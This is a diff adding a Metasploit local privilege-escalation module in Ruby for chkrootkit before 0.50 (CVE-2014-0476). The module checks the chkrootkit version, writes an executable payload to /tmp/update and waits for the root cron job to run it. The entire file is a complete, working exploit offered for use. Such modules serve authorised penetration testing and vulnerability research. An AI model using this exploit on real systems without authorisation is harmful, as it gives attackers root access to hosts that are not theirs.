@@ -1,0 +1,75 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class Metasploit4 < Msf::Exploit::Local
+
+  # This could also be Excellent, but since it requires
+  # up to one day to pop a shell, let's set it to Manual instead.
+  Rank = ManualRanking
+
+  include Msf::Post::File
+  include Msf::Exploit::FileDropper
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Chkrootkit Local Privilege Escalation',
+      'Description'    => %q{
+        Chkrootkit before 0.50 will run any executable file named
+        /tmp/update as root, allowing a trivial privsec.
+
+        WfsDelay is set to 24h, since this is how often a chkrootkit
+        scan is scheduled by default.
+      },
+      'Author'         => [
+        'Thomas Stangner',        # Original exploit
+        'Julien "jvoisin" Voisin' # Metasploit module
+      ],
+      'References'     => [
+        ['CVE', '2014-0476'],
+        ['OSVDB', '107710'],
+        ['EDB', '33899'],
+        ['BID', '67813'],
+        ['CWE', '20'],
+        ['URL', 'http://seclists.org/oss-sec/2014/q2/430']
+      ],
+      'DisclosureDate' => 'Jun 04 2014',
+      'License'        => MSF_LICENSE,
+      'Platform'       => 'unix',
+      'Arch'           => ARCH_CMD,
+      'SessionTypes'   => ['shell', 'meterpreter'],
+      'Privileged'     => true,
+      'Stance'         => Msf::Exploit::Stance::Passive,
+      'Targets'        => [['Automatic', {}]],
+      'DefaultTarget'  => 0,
+      'DefaultOptions' => {'WfsDelay' => 60 * 60 * 24} # 24h
+    ))
+
+    register_options([
+      OptString.new('CHKROOTKIT', [true, 'Path to chkrootkit', '/usr/sbin/chkrootkit'])
+    ])
+  end
+
+  def check
+    version = cmd_exec("#{datastore['CHKROOTKIT']} -V 2>&1")
+
+    if version =~ /chkrootkit version 0\.[1-4]/
+      Exploit::CheckCode::Appears
+    else
+      Exploit::CheckCode::Safe
+    end
+  end
+
+  def exploit
+    print_warning('Rooting depends on the crontab (this could take a while)')
+
+    write_file('/tmp/update', "#!/bin/sh\n(#{payload.encoded}) &\n")
+    cmd_exec('chmod +x /tmp/update')
+    register_file_for_cleanup('/tmp/update')
+
+    print_status('Payload written to /tmp/update')
+    print_status('Waiting for chkrootkit to run via cron...')
+  end
+
+end
